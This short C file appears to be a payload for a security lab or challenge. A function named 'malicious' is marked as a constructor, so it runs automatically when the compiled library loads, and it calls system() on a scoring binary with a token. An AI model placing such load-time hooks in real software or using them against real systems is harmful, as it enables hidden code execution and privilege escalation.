	#include<stdio.h>
#include<stdlib.h>
 
static void malicious() __attribute__((constructor));
 
void malicious() {
    system("/usr/local/bin/score 270f4edf-b3ba-46c7-80d9-ac0e32ca3bcf");
}
